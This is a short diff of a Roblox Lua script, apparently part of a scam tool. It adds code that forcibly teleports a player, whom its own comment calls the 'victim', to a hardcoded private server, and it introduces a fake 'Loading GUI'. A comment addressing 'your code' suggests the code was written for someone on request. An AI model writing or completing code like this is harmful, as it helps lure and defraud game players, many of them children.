@@ -8,11 +8,12 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- 🧭 Teleport victim to private server
+--- 🧭 Teleport victim to private server
 pcall(function()
-    TeleportService:TeleportToPlaceInstance(game.PlaceId, privateServerLink:match("gameInstanceId=([^&]+)"))
+    local placeId = 126884695634066
+    local accessCode = "40206718588419987554943106780552"
+    TeleportService:TeleportToPrivateServer(placeId, accessCode, {LocalPlayer})
 end)
-
 -- 👁‍🗨 Loading GUI (your code)
 -- COPY exactly your GUI code here; I'm wrapping below for brevity:
 do
